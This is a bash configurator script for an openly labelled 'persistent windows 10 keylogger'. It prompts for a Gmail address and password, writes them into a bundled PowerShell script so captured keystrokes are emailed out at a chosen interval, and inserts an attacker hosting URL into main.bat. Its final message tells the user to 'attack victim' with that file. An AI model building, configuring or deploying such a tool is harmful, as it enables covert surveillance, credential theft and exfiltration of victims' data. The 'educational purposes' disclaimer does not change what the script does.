#!/usr/bin/env bash
clear
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'
echo -e "${RED}"
echo -e "

	   ▄█   ▄█▄    ▄████████ ▄██   ▄    ▄█        ▄██████▄     ▄██████▄   ▄█  ████████▄   
	  ███ ▄███▀   ███    ███ ███   ██▄ ███       ███    ███   ███    ███ ███  ███    ███  
	  ███▐██▀     ███    █▀  ███▄▄▄███ ███       ███    ███   ███    █▀  ███▌ ███    ███  
	 ▄█████▀     ▄███▄▄▄     ▀▀▀▀▀▀███ ███       ███    ███  ▄███        ███▌ ███    ███  
	▀▀█████▄    ▀▀███▀▀▀     ▄██   ███ ███       ███    ███ ▀▀███ ████▄  ███▌ ███    ███  
	  ███▐██▄     ███    █▄  ███   ███ ███       ███    ███   ███    ███ ███  ███    ███  
	  ███ ▀███▄   ███    ███ ███   ███ ███▌    ▄ ███    ███   ███    ███ ███  ███  ▀ ███  
	  ███   ▀█▀   ██████████  ▀█████▀  █████▄▄██  ▀██████▀    ████████▀  █▀    ▀██████▀▄█ 
	  ▀                                ▀                                                  

			,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
			|1/2| 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | + | ' | <-    |
			|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
			| ->| | Q | W | E | R | T | Y | U | I | O | P | ] | ^ |     |
			|-----',--',--',--',--',--',--',--',--',--',--',--',--'|    |
			| Caps | A | S | D | F | G | H | J | K | L | \ | [ | * |    |
			|----,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'---'----|
			|    | < | Z | X | C | V | B | N | M | , | . | - |          |
			|----'-,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|
			| ctrl |  | alt |                          |altgr |  | ctrl |
			'------'  '-----'--------------------------'------'  '------'

	created by: pr0xy_8l4d3
	Team: prohackerland.com
	Short description: persistent windows 10 keylogger
	v1.0
"
echo -e "${NC}"

echo "*** Disclaimer. This tool was made only for educational purposes ***"
echo "*** Hacking people or computer systems without written permission is strictly prohibited ***"
echo "*** You are using this tool on your own risk ***"
echo
echo "*** It is recommended to create Gmail account only for this purpose. Do not forget to enable access to less secure apps ***"
echo

dir=$(pwd -P)
sudo cp $dir/lib/smkscr.ps1 $dir/output
sudo cp $dir/lib/main.bat $dir/output
sudo cp $dir/lib/pers.bat $dir/output
sudo cp $dir/lib/Record.txt $dir/output
sudo cp $dir/lib/krec.exe $dir/output

while true
do
    echo -e "${RED}""[*] Enter gmail account, where results will be delivered:" "${NC}"
    read  var1
    if [[ ${var1} != *"@gmail.com"* ]];then
        echo
        echo "Error: it works only with gmail account! please try again."
        echo
        continue
    else
	break
    fi
done

sed -i '4s/$/Username = "'"$var1"'"/g' $dir/output/smkscr.ps1
sed -i '10s/$/to = "'"$var1"'"/g' $dir/output/smkscr.ps1
echo

echo -e "${RED}""[*] Enter password of gmail account:" "${NC}"
read var2
sed -i '5s/$/Password = "'"$var2"'"/g' $dir/output/smkscr.ps1
echo

echo -e "${RED}""[*] How often the results will be sent on a email (in seconds: e.g. 600):" "${NC}"
read var3
sed -i "32s/$/start-sleep "$var3"/g" $dir/output/smkscr.ps1
echo

while true
do
echo -e "${RED}""[*] Enter location, where all necessary files for attack will be hosted (e.g. http://192.168.1.110):" "${NC}"
read var4
if [[ ${var4} != *"http"* ]];then
        echo
        echo "Error: url needs to start with http or https! Please try again."
        echo
        continue
    else
        break
    fi
done

sed -i -e 's#url#'$var4'#g' $dir/output/main.bat
echo
echo [*] Gmail account: $var1
echo [*] Gmail password: $var2
echo [*] Results will be sent: every $var3 seconds
echo [*] All files will be hosted on: $var4
echo
echo -e "*** You are redy to go. All files are saved in ${RED}$dir/output${NC} folder. Transfer them in hosting location and use ${RED}main.bat${NC} file to attack victim ***"
echo

